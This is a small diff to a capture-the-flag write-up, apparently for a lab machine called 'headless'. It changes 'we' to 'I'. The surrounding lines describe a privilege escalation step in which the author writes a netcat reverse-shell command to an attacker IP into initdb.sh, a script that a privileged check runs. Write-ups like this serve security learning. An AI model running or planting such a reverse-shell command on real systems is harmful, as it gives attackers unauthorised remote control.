@@ -98,7 +98,7 @@ It seemed we had access to the contents of /usr/bin/syscheck. I decided to exami
 
 ![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(149).png)
 
-Noticing that the file initdb.sh was being launched, we decided to insert a payload into that file.
+Noticing that the file initdb.sh was being launched, I decided to insert a payload into that file.
 I executed the following commands:
 
 `echo "nc -e /bin/sh 10.10.14.21 1444" > initdb.sh`
